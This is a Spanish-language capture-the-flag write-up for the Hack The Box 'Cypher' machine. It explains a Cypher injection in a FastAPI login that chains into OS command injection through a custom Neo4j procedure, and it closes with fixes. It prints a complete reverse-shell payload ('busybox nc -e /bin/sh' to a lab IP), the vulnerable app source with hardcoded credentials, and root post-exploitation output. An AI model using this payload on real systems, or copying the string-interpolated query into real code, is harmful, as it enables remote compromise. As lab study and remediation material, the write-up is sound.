#### **¿Qué son los comandos Cypher?**

Cypher es un lenguaje de consulta declarativo diseñado específicamente para bases de datos orientadas a grafos, como Neo4j. Los comandos Cypher permiten interactuar con la base de datos para crear, leer, actualizar y eliminar datos en forma de nodos y relaciones.

En este caso, el payload explota las siguientes características de Cypher:

1. **Cierre del contexto de cadena (`'`)** :  
    Al cerrar el contexto de cadena con una comilla simple (`'`), el atacante puede romper la estructura original de la consulta Cypher y añadir su propio código malicioso.
    
2. **Cláusula `RETURN`:**  
    Se utiliza para devolver datos de la consulta. En el payload, la primera cláusula `RETURN` (`RETURN h.value AS a`) actúa como un "relleno" para mantener la estructura válida antes del `UNION`.
    
3. **Operador `UNION`:**  
    Combina los resultados de dos consultas. Aquí, se utiliza para unir la consulta legítima con la consulta maliciosa que contiene el comando de ejecución remota.
    
4. **Procedimiento personalizado (`CALL custom.getUrlStatusCode`):**  
    Este procedimiento personalizado ejecuta un comando `curl` en el servidor para realizar una solicitud HTTP. En este caso, se explota para realizar una inyección de comandos y ejecutar una shell inversa.
    
5. **Cláusulas `YIELD` y `RETURN`:**  
    Estas cláusulas finalizan la consulta de manera que no genere errores de sintaxis, asegurando que el payload se ejecute correctamente.



## Post explotación 

Si revisamos[ el código del .jar ](obsidian://open?vault=HTB&file=Machines%2FCypher%2FCustomFunctions)alojado en la maquina `cypher` :
```java
  String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};  
```


la aplicacion web funciona dentro de un contenedor de docker se nos redirige alli gracias a un proxy inverso nginx 

```bash
root@cypher:/# docker ps  -a
CONTAINER ID   IMAGE                       COMMAND                  CREATED       STATUS       PORTS                      NAMES
d1313f9003f3   cypher-htb-fastapi:latest   "uvicorn app:app --r…"   10 days ago   Up 2 hours   127.0.0.1:8000->8000/tcp   fastapi

```


### [[App.py]]
A continuacion el codigo de la aplicacion web: (app.py)

```python
import json
import traceback
from time import sleep
from hashlib import sha1
from datetime import timedelta
from contextlib import suppress

from pydantic import BaseModel

from starlette.responses import Response, RedirectResponse

from fastapi import FastAPI, Depends, Request
from fastapi.responses import HTMLResponse
from fastapi_login import LoginManager
from fastapi_login.exceptions import InvalidCredentialsException


import logging

log = logging.getLogger("gunicorn.error")


from neo4j import GraphDatabase

# Neo4j connection details
URI = "bolt://host.docker.internal:7687"
USERNAME = "neo4j"
PASSWORD = "cU4btyib.20xtCMCXkBmerhK"

### DATABASE ###

# wait for neo4j to come up
while 1:
    try:
        driver = GraphDatabase.driver(URI, auth=(USERNAME, PASSWORD))
        with driver.session() as session:
            session.run("Match () Return 1 Limit 1")
            break
    except Exception:
        log.error(traceback.format_exc())
        sleep(1)


def create_node(tx, label, properties):
    for k,v in dict(properties).items():
        if isinstance(v, dict):
            properties.pop(k)
    query = (
        f"CREATE (n:{label} $properties)"
    )
    tx.run(query, properties=properties)

def create_relationship(tx, src, dst, type):
    query = (
        "MATCH (a), (b) "
        "WHERE a.id = $src AND b.id = $dst "
        f"CREATE (a)-[:{type}]->(b)"
    )
    tx.run(query, src=src, dst=dst)

def run_cypher(cypher):
    with driver.session() as session:
        return [r.data() for r in session.run(cypher)]


### CREATE ADMIN USER ###

for cypher in [
    "CREATE CONSTRAINT uniq_user IF NOT EXISTS FOR (user:USER) REQUIRE user.username IS UNIQUE",
    "CREATE CONSTRAINT uniq_pass IF NOT EXISTS FOR (pass:HASH) REQUIRE pass.value IS UNIQUE",
    "CREATE FULLTEXT INDEX dns_name_data_fulltext FOR (n:DNS_NAME) ON EACH [n.data]",
    """
    MERGE (u:USER {name:'graphasm'})
    MERGE (p:SHA1 {value: '9f54ca4c130be6d529a56dee59dc2b2090e43acf'})
    MERGE (u)-[:SECRET]->(p)
    """
]:
    with suppress(Exception):
        run_cypher(cypher)


### POPULATE DB ###

dns_name = run_cypher("Match (n:DNS_NAME) Return n Limit 1")
if not dns_name:
    with driver.session() as session:
        with open("webroot/sanitized.json", 'r') as file:
            events = list([json.loads(line) for line in file])
            print('creating nodes')
            for event in events:
                session.execute_write(create_node, event["type"], event)
            print('creating relationships')
            for event in events:
                session.execute_write(create_relationship, event["parent"], event["id"], event["module"])


### BASE APP ###

app = FastAPI()


@app.get("/api")
async def root():
    return RedirectResponse("/api/docs")


### SECURITY ###

class NotAuthenticatedException(Exception):
    pass

SECRET = "563e56a8078fab3dd7d3dc1e97d9af498fac07e49479dd9a83b8d028b0145226"

manager = LoginManager(SECRET, token_url="/auth", use_cookie=True, not_authenticated_exception=NotAuthenticatedException)


@app.exception_handler(NotAuthenticatedException)
def auth_exception_handler(request: Request, exc: NotAuthenticatedException):
    """
    Redirect the user to the login page if not logged in
    """
    return RedirectResponse(url="/login")


@app.get("/demo", response_class=HTMLResponse)
async def demo(user=Depends(manager)):
    with open("/app/demo.html", "r") as f:
        return f.read()


@manager.user_loader()
def load_user(username: str):
    # TODO: flesh this out
    return {"username": "graphasm"}


def verify_creds(username, password):
    cypher = (
        f"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '{username}' return h.value as hash"
    )
    try:
        results = run_cypher(cypher)
        if results:
            db_hash = results[0]["hash"]
            password = password.encode(errors="ignore")
            hashed_password = sha1(password).hexdigest()
            if hashed_password == db_hash:
                return True
        return False
    except Exception:
        raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")



class LoginForm(BaseModel):
    username: str
    password: str


@app.post("/api/auth")
def login(loginform: LoginForm):
    username = loginform.username
    password = loginform.password
    try:
        creds_valid = verify_creds(username, password)
    except Exception:
        return Response(traceback.format_exc(), status_code=400)
    if not creds_valid:
        raise InvalidCredentialsException

    token = manager.create_access_token(
        data=dict(sub=username), expires=timedelta(hours=12)
    )
    response = Response("ok")
    response.set_cookie(key=manager.cookie_name, value=token)
    return response


@app.get("/api/cypher")
def get_nodes(query: str):
    if "alter " in query.lower() or "merge " in query.lower():
        return Response("Access denied", status_code=400)
    try:
        return run_cypher(query)
    except Exception:
        return Response(traceback.format_exc(), status_code=400)

```

La parte vulnerable que nos lleva al rce dentro de la maquina es el siguiente error dentro del codigo
```python
cypher = f"MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '{username}' RETURN h.value as hash"
```

### **Flujo de Explotación:**

El exploit se divide en **dos capas de inyección** :

- **Capa 1:** Inyección de **Cypher** en el formulario de login.
- **Capa 2:** Inyección de **comandos del sistema** mediante el procedimiento `custom.getUrlStatusCode`

### **Cómo se Comunica el Exploit con el Servidor:**

El atacante envía una solicitud **POST** a `/api/auth` con credenciales maliciosas. Por ejemplo:

```http
POST /api/auth HTTP/1.1
Content-Type: application/json

{
  "username": "a' RETURN h.value AS a UNION CALL custom.getUrlStatusCode('example.com;busybox nc -e /bin/sh 10.10.x.x 4444;#') YIELD statusCode AS a RETURN a;//",
  "password": "any_password"
}
```

### **Análisis del Código Vulnerable:**

#### **Inyección de Cypher en `verify_creds`:**

La función `verify_creds` construye una consulta **Cypher** usando interpolación de cadenas **sin sanitizar** el `username`:

```python
def verify_creds(username, password):
    cypher = (
        f"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '{username}' return h.value as hash"
    )
    results = run_cypher(cypher)
    # ...
```

Si el `username` es `a' UNION...`, la consulta se transforma en:

```cypher
MATCH (u:USER)-[:SECRET]->(h:SHA1) 
WHERE u.name = 'a' 
RETURN h.value AS a 
UNION 
CALL custom.getUrlStatusCode('example.com;busybox nc -e /bin/sh 10.10.x.x 4444;#') 
YIELD statusCode AS a 
RETURN a;//'
```


El procedimiento `custom.getUrlStatusCode` ejecuta `curl` en el sistema operativo **sin validar la URL** , permitiendo inyectar comandos con `;`



# FIX
#### **a. Sanitizar Inputs en Cypher (Evitar Inyecciones):**

Usar **parámetros** en lugar de interpolación de cadenas:

```cypher
# Antes (vulnerable):
cypher = f"MATCH (u:USER) WHERE u.name = '{username}' RETURN u"

# Después (seguro):
cypher = "MATCH (u:USER) WHERE u.name = $username RETURN u"
results = run_cypher(cypher, username=username)
```

####  **b.Validar URLs en `custom.getUrlStatusCode`:**

- **Evitar caracteres peligrosos** (`;`, `|`, `&`, etc.).
- **Usar librerías HTTP en Java** en lugar de `curl`:

```java
// Reemplazar el comando curl con HttpURLConnection
HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
conn.setRequestMethod("HEAD");
int statusCode = conn.getResponseCode();
```